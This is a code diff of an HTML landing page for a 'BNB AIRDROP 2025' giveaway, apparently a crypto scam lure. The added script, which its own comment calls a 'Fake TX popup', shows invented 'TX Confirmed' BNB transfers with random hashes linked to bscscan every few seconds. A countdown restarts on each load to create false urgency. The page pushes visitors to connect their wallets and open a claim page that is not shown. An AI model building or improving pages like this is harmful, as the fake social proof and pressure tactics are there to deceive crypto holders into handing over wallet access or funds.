@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>BNB AIRDROP 2025 — Surreal Web3 Experience</title>
+    <title>BNB AIRDROP 2025 — Live Global Distribution</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/fflate@0.7.4/dist/fflate.min.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
             --bg: #000;
             --text: #fff;
             --gold: #f3ba2f;
-            --gold-grad: linear-gradient(180deg, #fff, #f3ba2f);
             --blue: #00aaff;
+            --green: #00ff00;
         }
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Orbitron', sans-serif;
+            font-family: 'Segoe UI', sans-serif;
         }
         body {
             background: var(--bg);
@@ -27,12 +28,21 @@
             overflow: hidden;
             position: relative;
         }
-        #canvas-container {
+        #globe-container {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            z-index: -1;
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.8) 100%);
             z-index: -1;
         }
         header {
@@ -52,12 +62,6 @@
             font: 900 1.6em 'Orbitron', sans-serif;
             color: var(--text);
         }
-        .logo span {
-            background: var(--gold-grad);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-left: 8px;
-        }
         .logo .coin {
             width: 28px;
             height: 28px;
@@ -70,14 +74,17 @@
             color: #000;
             margin-right: 8px;
         }
-        nav {
-            display: flex;
-            gap: 18px;
+        .logo span {
+            background: linear-gradient(180deg, #fff, #f3ba2f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-left: 8px;
         }
         nav a {
             color: var(--text);
             text-decoration: none;
             font-size: 0.95em;
+            margin: 0 10px;
         }
         nav a:hover, nav a.active {
             color: var(--gold);
@@ -103,11 +110,21 @@
             z-index: 10;
             min-height: 100vh;
         }
+        .hero h1 {
+            color: var(--gold);
+            font: 900 2.8em 'Orbitron', sans-serif;
+            margin: 10px 0;
+            text-shadow: 0 0 20px rgba(243, 186, 47, 0.8);
+        }
+        .hero p {
+            color: #ccc;
+            font-size: 1.3em;
+            margin: 10px 0;
+        }
         .countdown {
             color: var(--gold);
             font-size: 1.4em;
             margin: 20px 0;
-            text-shadow: 0 0 15px rgba(243, 186, 47, 0.8);
             font-weight: 600;
         }
         .hero-buttons {
@@ -130,7 +147,6 @@
             align-items: center;
             gap: 10px;
             box-shadow: 0 0 30px rgba(243, 186, 47, 0.4);
-            animation: pulse 2s infinite;
             min-width: 280px;
         }
         .how-btn {
@@ -145,64 +161,21 @@
             align-items: center;
             gap: 10px;
         }
-        .vortex {
+        .tx-popup {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 300px;
-            border: 2px solid var(--blue);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0.2;
-            z-index: 1;
-            animation: rotate 20s linear infinite;
+            background: rgba(0,0,0,0.9);
+            border: 1px solid var(--green);
+            border-radius: 8px;
+            padding: 10px 15px;
+            color: var(--green);
+            font-size: 0.9em;
+            z-index: 1000;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+            opacity: 0;
+            transition: opacity 0.3s;
         }
-        .vortex::before {
-            content: '';
-            position: absolute;
-            width: 250px;
-            height: 250px;
-            border: 2px solid var(--gold);
-            border-radius: 50%;
-            animation: rotate 15s linear reverse infinite;
-        }
-        .vortex::after {
-            content: '';
-            position: absolute;
-            width: 200px;
-            height: 200px;
-            border: 2px solid #00ccff;
-            border-radius: 50%;
-            animation: rotate 10s linear infinite;
-        }
-        .bnb-stack {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            z-index: 2;
-        }
-        .bnb-cube {
-            width: 60px;
-            height: 60px;
-            background: var(--gold);
-            color: #000;
-            font: 900 1.2em 'Orbitron', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            border-radius: 12px;
-            box-shadow: 0 0 20px rgba(243, 186, 47, 0.6);
-            animation: float 4s ease-in-out infinite;
-        }
-        .bnb-label {
-            color: var(--text);
-            font-size: 1.1em;
-            margin-top: 10px;
-            opacity: 0.8;
+        .tx-popup.show {
+            opacity: 1;
         }
         .features {
             display: flex;
@@ -235,29 +208,17 @@
             font-size: 0.8em;
             color: #999;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(243, 186, 47, 0.4); }
-            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(243, 186, 47, 0.8); }
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
-        }
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         @media (max-width: 768px) {
             .hero-buttons { flex-direction: column; align-items: center; }
             .claim-btn, .how-btn { width: 80%; }
             .features { flex-direction: column; align-items: center; }
-            .feature { width: 100%; text-align: center; }
         }
     </style>
 </head>
 <body>
 
-<div id="canvas-container"></div>
+<div id="globe-container"></div>
+<div class="overlay"></div>
 
 <header>
     <div class="logo">
@@ -277,14 +238,9 @@
 </header>
 
 <section class="hero">
-    <h1 style="font-size: 2.5em; background: var(--gold-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
-        BNB AIRDROP
-    </h1>
-    <p style="font-size: 1.3em; color: #ccc; margin: 15px 0;">
-        Claim your free BNB tokens now
-    </p>
-
-    <div class="countdown" id="countdown">3d 14h 26m Time Left</div>
+    <h1>BNB AIRDROP</h1>
+    <p>Claim your free BNB tokens now</p>
+    <div class="countdown" id="countdown">3d 14h 25m Time Left</div>
 
     <div class="hero-buttons">
         <button class="claim-btn" onclick="window.open('claim.html', '_blank')">
@@ -294,14 +250,6 @@
             <i class="fas fa-play"></i> How It Works
         </button>
     </div>
-
-    <div class="vortex" id="vortex"></div>
-    <div class="bnb-stack">
-        <div class="bnb-cube">BNB</div>
-        <div class="bnb-cube">BNB</div>
-        <div class="bnb-cube">BNB</div>
-    </div>
-    <div class="bnb-label">BNB</div>
 </section>
 
 <section class="features">
@@ -328,59 +276,126 @@
 </section>
 
 <script>
-    // === 3D VORTEX ===
+    // === 3D GLOBE ===
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
     const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
     renderer.setSize(window.innerWidth, window.innerHeight);
-    document.getElementById("canvas-container").appendChild(renderer.domElement);
+    document.getElementById("globe-container").appendChild(renderer.domElement);
 
-    // Floating 3D BNB Cubes
-    const cubes = [];
-    for (let i = 0; i < 8; i++) {
-        const geometry = new THREE.BoxGeometry(20, 20, 20);
-        const material = new THREE.MeshPhongMaterial({
-            color: 0xf3ba2f,
-            emissive: 0xf3ba2f,
-            emissiveIntensity: 0.5,
-            wireframe: Math.random() > 0.7
-        });
-        const cube = new THREE.Mesh(geometry, material);
-        cube.position.set(
-            Math.random() * 400 - 200,
-            Math.random() * 400 - 200,
-            Math.random() * 400 - 200
+    // Earth
+    const geometry = new THREE.SphereGeometry(5, 64, 64);
+    const textureLoader = new THREE.TextureLoader();
+    const earthTexture = textureLoader.load("https://raw.githubusercontent.com/mrdoob/three.js/dev/examples/textures/planets/earth_atmos_2048.jpg");
+    const bumpMap = textureLoader.load("https://raw.githubusercontent.com/mrdoob/three.js/dev/examples/textures/planets/earth_normal_2048.jpg");
+    const material = new THREE.MeshPhongMaterial({
+        map: earthTexture,
+        bumpMap: bumpMap,
+        bumpScale: 0.05,
+        specular: new THREE.Color(0x333333)
+    });
+    const earth = new THREE.Mesh(geometry, material);
+    scene.add(earth);
+
+    // Glow
+    const glowGeometry = new THREE.SphereGeometry(5.1, 64, 64);
+    const glowMaterial = new THREE.MeshBasicMaterial({
+        color: 0x00aaff,
+        transparent: true,
+        opacity: 0.2
+    });
+    const glow = new THREE.Mesh(glowGeometry, glowMaterial);
+    scene.add(glow);
+
+    camera.position.z = 8;
+
+    // Cities (glowing points)
+    const cities = [
+        { lat: 40.7128, lon: -74.0060, name: "New York" },    // USA
+        { lat: 35.6895, lon: 139.6917, name: "Tokyo" },       // Japan
+        { lat: 51.5074, lon: -0.1278, name: "London" },       // UK
+        { lat: 48.8566, lon: 2.3522, name: "Paris" },         // France
+        { lat: 19.4326, lon: -99.1332, name: "Mexico City" }, // Mexico
+        { lat: -23.5505, lon: -46.6333, name: "São Paulo" },  // Brazil
+        { lat: 28.6139, lon: 77.2090, name: "Delhi" },        // India
+        { lat: 31.2304, lon: 121.4737, name: "Shanghai" }     // China
+    ];
+
+    const cityPoints = [];
+    cities.forEach(city => {
+        const phi = (90 - city.lat) * Math.PI / 180;
+        const theta = (city.lon + 180) * Math.PI / 180;
+        const x = -5 * Math.sin(phi) * Math.cos(theta);
+        const y = 5 * Math.cos(phi);
+        const z = 5 * Math.sin(phi) * Math.sin(theta);
+
+        const point = new THREE.Mesh(
+            new THREE.SphereGeometry(0.08, 16, 16),
+            new THREE.MeshBasicMaterial({ color: 0x00ff00 })
         );
-        cube.rotation.set(
-            Math.random(),
-            Math.random(),
-            Math.random()
+        point.position.set(x, y, z);
+        scene.add(point);
+        cityPoints.push({ point, city });
+    });
+
+    // Animated arrows between cities
+    function createArrow(start, end) {
+        const direction = new THREE.Vector3().subVectors(end, start);
+        const length = direction.length();
+        const arrow = new THREE.ArrowHelper(
+            direction.normalize(),
+            start,
+            length,
+            0x00aaff,
+            0.2,
+            0.1
         );
-        scene.add(cube);
-        cubes.push({
-            mesh: cube,
-            speed: {
-                x: Math.random() * 0.02,
-                y: Math.random() * 0.02,
-                z: Math.random() * 0.02
-            }
-        });
+        scene.add(arrow);
+        setTimeout(() => {
+            scene.remove(arrow);
+        }, 5000);
     }
 
-    camera.position.z = 500;
+    function randomTx() {
+        const start = cityPoints[Math.floor(Math.random() * cityPoints.length)];
+        let end;
+        do {
+            end = cityPoints[Math.floor(Math.random() * cityPoints.length)];
+        } while (end === start);
+
+        const startVec = start.point.position;
+        const endVec = end.point.position;
+        createArrow(startVec, endVec);
+
+        // Fake TX popup
+        const txHash = "0x" + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+        const amount = (Math.random() * 0.9 + 0.1).toFixed(2);
+        const popup = document.createElement("div");
+        popup.className = "tx-popup";
+        popup.innerHTML = `
+            <strong>TX Confirmed</strong><br>
+            ${amount} BNB → ${end.city.name}<br>
+            <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color:#00ccff; text-decoration:underline;">${txHash.slice(0,8)}...${txHash.slice(-6)}</a>
+        `;
+        popup.style.left = Math.random() * 80 + 10 + "vw";
+        popup.style.top = Math.random() * 60 + 20 + "vh";
+        document.body.appendChild(popup);
+        setTimeout(() => {
+            popup.classList.add("show");
+            setTimeout(() => {
+                popup.classList.remove("show");
+                setTimeout(() => popup.remove(), 300);
+            }, 4000);
+        }, 100);
+    }
+
+    // Random TX every 3 seconds
+    setInterval(randomTx, 3000);
+    setTimeout(() => setInterval(randomTx, 3000), 5000);
 
     function animate() {
         requestAnimationFrame(animate);
-        cubes.forEach(item => {
-            item.mesh.rotation.x += item.speed.x;
-            item.mesh.rotation.y += item.speed.y;
-            item.mesh.rotation.z += item.speed.z;
-            item.mesh.position.y -= 0.1;
-            if (item.mesh.position.y < -300) {
-                item.mesh.position.y = 300;
-                item.mesh.position.x = Math.random() * 400 - 200;
-            }
-        });
+        earth.rotation.y += 0.001;
         renderer.render(scene, camera);
     }
     animate();
@@ -392,7 +407,7 @@
     });
 
     // === COUNTDOWN ===
-    const endTime = new Date().getTime() + 3 * 86400000 + 14 * 3600000 + 26 * 60000;
+    const endTime = new Date().getTime() + 3 * 86400000 + 14 * 3600000 + 25 * 60000;
     function updateCountdown() {
         const now = new Date().getTime();
         const diff = endTime - now;
@@ -412,7 +427,7 @@
         }
         try {
             await window.ethereum.request({ method: "eth_requestAccounts" });
-            alert("✅ Wallet connected!");
+            alert("✅ Wallet connected to global airdrop network.");
         } catch (err) {
             console.error(err);
         }
